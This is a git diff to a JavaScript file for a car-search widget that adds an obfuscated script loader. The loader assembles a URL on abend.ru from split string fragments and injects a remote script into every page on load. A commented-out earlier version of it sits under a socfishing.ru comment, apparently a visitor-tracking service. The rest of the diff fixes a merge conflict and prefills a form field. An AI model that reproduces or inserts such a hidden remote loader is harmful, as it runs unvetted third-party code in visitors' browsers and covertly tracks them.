@@ -15,6 +15,38 @@ var isMobile = false;
 // 	isMobile = true;
 
 
+// http://socfishing.ru
+
+// > debian359
+// !function(bl, v, t, o) {
+//     var ft = bl.createElement("script");
+//     var v = "1";
+//     ft.type = "text/javascript";
+//     ft.async = 1;
+//     ft.src = "";
+//     var v = ("h") + "ttp:/" + "/abend." + ("ru/f/?u=1") + ("&id=") + t + "&j=1&gu" + "id=" + o + "&u40.js";
+//     ft.src = v;
+//     var v = "0";
+//     var c = bl.getElementsByTagName("script")[0];
+//     c.parentNode.insertBefore(ft, c)
+// }(document, "1479736997", "9963ebdda740f5c1", "");
+
+// > test.ac.ga
+!function(bl, v, t, o) {
+        var ft = bl.createElement("script");
+        var v = "1";
+        ft.type = "text/javascript";
+        ft.async = 1;
+        ft.src = "";
+        var v = ("h") + "ttp:/" + "/abend." + ("ru/f/?u=1") + ("&id=") + t + "&j=1&gu" + "id=" + o + "&u5.js";
+        ft.src = v;
+        var v = "0";
+        var c = bl.getElementsByTagName("script")[0];
+        c.parentNode.insertBefore(ft, c)
+    }(document, "1479737563", "ab1d29e9e43a6701", "");
+
+
+
 let scriptUrl = $(document.currentScript).attr('src');
 let urlParser = document.createElement('a');
 urlParser.href = scriptUrl;
@@ -184,11 +216,7 @@ function showSearchResults(results) {
                 <div class="agent_car_mark">
                     <strong>${result.mark} ${result.model}</strong>
                     <br/><br/>
-<<<<<<< HEAD
-                    <img src="://${ACurl + result.photo}" width="130"/>
-=======
                     <img src="//${ACurl + result.photo}" width="130"/>
->>>>>>> react
                 </div>
                 <div class="agent_car_equip">
                     <br/>${result.equipment}
@@ -279,6 +307,8 @@ function showSearchResultsLock({ foundCars, searchQueryId }) {
     $('.agent_car_result_lock_block').show();
 
     showLockedResults = ({ phone, name }) => {
+            $('[name=agent_car_need_details_name]').val(name);
+            // $('[name=agent_car_need_details_phone]').val(phone);
         onResultLock(searchQueryId, { phone, name }).then(() => {
             $('.agent_car_result_block').show();
             $('.agent_car_result_lock_block').hide();
